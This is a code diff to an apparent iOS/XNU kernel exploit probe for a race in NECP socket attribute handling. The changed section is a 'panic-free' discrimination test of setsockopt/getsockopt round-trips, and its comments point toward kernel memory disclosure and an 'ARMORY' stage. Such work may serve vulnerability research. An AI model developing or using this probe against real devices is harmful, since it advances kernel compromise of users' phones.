@@ -52,7 +52,7 @@
 #import <sys/socket.h>
 #import <unistd.h>
 
-#define P183_BUILD @"p183-necp-sockattr-race-v1"
+#define P183_BUILD @"p183-necp-sockattr-race-v2-p1disc"
 
 /* the train-stable ABI number (see the option-number law above) */
 #ifndef P183_SO_NECP_ATTRIBUTES
@@ -195,63 +195,91 @@ static void *p183_getter_thread(void *arg) {
     L(@"PANIC-POSSIBLE via the trap. A disclosure is NOT hasKread.");
     L([LabDeviceProfile identBlock] ?: @"ident=?");
 
-    /* ── P1: the grammar + round-trip control ── */
+    /* ── P1: the grammar + get-path discrimination control (v2, PANIC-FREE) ──
+       12377 source laws (settled 2026-11-27): (a) an ABSENT TLV CLEARS its
+       slot, so single-type calls cross-clear -- the v1 sequence ended with
+       only TRACKER+CONTEXT live; (b) the SET is LOCKED (necp_lock_socket_
+       attributes around swap+free) -- the TOCTOU is the GET side running
+       unlocked against that swap. The v1 anomaly (len untouched + zeros)
+       needs discrimination: no-op case vs early/alloc-fail vs cross-clear. */
     L(@"");
-    L(@"=== P1: the attribute grammar control (PANIC-FREE) ===");
+    L(@"=== P1: the grammar + get-path discrimination (PANIC-FREE) ===");
     int s = socket(AF_INET6, SOCK_DGRAM, 0);
     if (s < 0) {
         L([NSString stringWithFormat:@"[-] socket failed errno=%d", errno]);
         if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
         return log;
     }
-    const struct { int type; const char *nm; int single; } types[] = {
-        { P183_TLV_DOMAIN,         "DOMAIN(7)",        0 },
-        { P183_TLV_ACCOUNT,        "ACCOUNT(8)",       0 },
-        { P183_TLV_DOMAIN_OWNER,   "OWNER(11)",        0 },
-        { P183_TLV_TRACKER_DOMAIN, "TRACKER(12)",      0 },
-        { P183_TLV_DOMAIN_CONTEXT, "CONTEXT(13)",      1 },
+
+    /* P1a: the invalid-option baseline (is rc=0+len-untouched the no-op
+       shape on this train, or does an unknown option error?) */
+    {
+        uint8_t buf[0x1000];
+        socklen_t len = sizeof buf;
+        memset(buf, 0xA5, sizeof buf);
+        int rc = getsockopt(s, SOL_SOCKET, 0x9999, buf, &len);
+        L([NSString stringWithFormat:
+           @"[P1a] INVALID-option control (0x9999): rc=%d errno=%d "
+           @"len=%u%@ -- the no-op baseline", rc, rc ? errno : 0, len,
+           len == sizeof buf ? @" (UNTOUCHED)" : @""]);
+    }
+
+    /* P1b: per-type set -> IMMEDIATE get (one TLV, no cross-clearing) */
+    const struct { int type; const char *nm; } types[] = {
+        { P183_TLV_DOMAIN,         "DOMAIN(7)" },
+        { P183_TLV_ACCOUNT,        "ACCOUNT(8)" },
+        { P183_TLV_DOMAIN_OWNER,   "OWNER(11)" },
+        { P183_TLV_TRACKER_DOMAIN, "TRACKER(12)" },
+        { P183_TLV_DOMAIN_CONTEXT, "CONTEXT(13)" },
     };
-    char mark[64];
-    uint8_t tlv[80];
-    int liveTypes = 0;
+    int liveTypes = 0, roundTrip = 0;
     for (size_t i = 0; i < sizeof(types) / sizeof(types[0]); i++) {
+        char mark[64];
         int mlen = snprintf(mark, sizeof mark, "P183C%zu-%02d", i, (int)i);
+        uint8_t tlv[80];
         int n = p183_tlv(tlv, sizeof tlv, (uint8_t)types[i].type,
                          mark, mlen + 1);
         int rc = setsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES,
                             tlv, (socklen_t)n);
-        L([NSString stringWithFormat:@"[P1] set %-14s rc=%d errno=%d%@",
-           types[i].nm, rc, rc ? errno : 0,
-           rc == 0 ? @"  <- ACCEPTED (the churn vehicle is ALIVE)" : @""]);
-        if (rc == 0) liveTypes++;
-    }
-    /* the CONTEXT single-TLV law: set it ALONE (the 12377 single_tlv flag) */
-    {
-        int mlen = snprintf(mark, sizeof mark, "P183CTX");
-        int n = p183_tlv(tlv, sizeof tlv, P183_TLV_DOMAIN_CONTEXT,
-                         mark, mlen + 1);
-        int rc = setsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES,
-                            tlv, (socklen_t)n);
-        L([NSString stringWithFormat:@"[P1] set CONTEXT-alone rc=%d errno=%d "
-           @"(the single-TLV law)", rc, rc ? errno : 0]);
-    }
-    /* round-trip */
-    {
         uint8_t buf[0x1000];
         socklen_t len = sizeof buf;
         memset(buf, 0, sizeof buf);
-        int rc = getsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES,
-                            buf, &len);
-        L([NSString stringWithFormat:@"[P1] get rc=%d len=%u", rc, len]);
-        if (rc == 0 && len > 0) {
-            NSMutableString *hx = [NSMutableString string];
-            for (size_t i = 0; i < len && i < 96; i++)
-                [hx appendFormat:@"%02x", buf[i]];
-            L([NSString stringWithFormat:@"[P1] first96: %@", hx]);
-            if (memmem(buf, len, "P183C", 5))
-                L(@"[P1] ROUND-TRIP OK -- the markers came back; the two-pass");
-            L(@"    read is live from this app on THIS build.");
-        }
+        int grc = rc == 0 ? getsockopt(s, SOL_SOCKET,
+                                       P183_SO_NECP_ATTRIBUTES,
+                                       buf, &len) : -1;
+        int hasMark = (grc == 0 && memmem(buf, len, mark, strlen(mark)));
+        if (rc == 0) liveTypes++;
+        if (hasMark) roundTrip++;
+        L([NSString stringWithFormat:
+           @"[P1b] %-14s set rc=%d errno=%d | get rc=%d len=%u%@ -- "
+           @"round-trip %@", types[i].nm, rc, rc ? errno : 0, grc, len,
+           grc == 0 && len != sizeof buf
+               ? @" (LEN UPDATED -- the get case IS live)" : @"",
+           hasMark ? @"OK (the markers came back)" : @"MISS"]);
+    }
+
+    /* P1c: the cross-clear law on this train: DOMAIN then ACCOUNT -> get
+       (does DOMAIN survive a second single-type call?) */
+    {
+        uint8_t tlvA[32], tlvB[32];
+        int nA = p183_tlv(tlvA, sizeof tlvA, P183_TLV_DOMAIN,
+                          "P183XDOMAIN", 12);
+        int nB = p183_tlv(tlvB, sizeof tlvB, P183_TLV_ACCOUNT,
+                          "P183XACCT", 10);
+        setsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES, tlvA, (socklen_t)nA);
+        setsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES, tlvB, (socklen_t)nB);
+        uint8_t buf[0x1000];
+        socklen_t len = sizeof buf;
+        memset(buf, 0, sizeof buf);
+        int grc = getsockopt(s, SOL_SOCKET, P183_SO_NECP_ATTRIBUTES,
+                             buf, &len);
+        int domAlive = (grc == 0 && memmem(buf, len, "P183XDOMAIN", 11));
+        L([NSString stringWithFormat:
+           @"[P1c] DOMAIN then ACCOUNT -> get rc=%d len=%u -- DOMAIN %@ "
+           @"(the absent-TLV-clears law on this train: %@)", grc, len,
+           domAlive ? @"SURVIVED" : @"CLEARED",
+           domAlive ? @"absent TLVs leave slots alone"
+                   : @"absent TLVs clear the slot (the 12377 law)"]);
     }
 
     /* ── P2: the ARMORY gate ── */
